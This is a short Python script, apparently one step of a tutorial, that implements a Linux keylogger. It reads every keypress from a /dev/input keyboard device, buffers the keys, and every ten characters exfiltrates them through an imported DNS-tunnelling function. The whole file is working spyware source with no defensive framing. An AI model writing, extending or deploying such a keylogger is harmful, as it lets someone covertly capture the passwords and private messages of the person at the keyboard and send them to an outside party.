from evdev import InputDevice, categorize, ecodes
from dns_exfil import send_data_over_dns  # Import our new module

# CHANGE THIS to your correct event ID found in previous steps
KEYBOARD_EVENT = "/dev/input/event6" 

keyboard = InputDevice(KEYBOARD_EVENT)

print(f"[+] Listening for keystrokes on {KEYBOARD_EVENT}...")
print("[+] Keystrokes will be sent via DNS every 10 characters.")

# Buffer to store keys before sending
keystroke_buffer = ""
SEND_THRESHOLD = 10  # Send data after every 10 keys

try:
    for event in keyboard.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:
                
                # 1. Clean the key name (Remove "KEY_" prefix)
                raw_key = key_event.keycode
                clean_key = raw_key.replace("KEY_", "")
                
                # Handle space and enter for better readability
                if clean_key == "SPACE": clean_key = " "
                elif clean_key == "ENTER": clean_key = "[ENT]"
                
                # 2. Add to buffer
                keystroke_buffer += clean_key
                print(f"Buffer: {keystroke_buffer}") # Print locally for debug

                # 3. Check if buffer is full, then EXFILTRATE
                if len(keystroke_buffer) >= SEND_THRESHOLD:
                    send_data_over_dns(keystroke_buffer)
                    keystroke_buffer = "" # Reset buffer

except KeyboardInterrupt:
    print("\n[+] Keylogger stopped cleanly.")
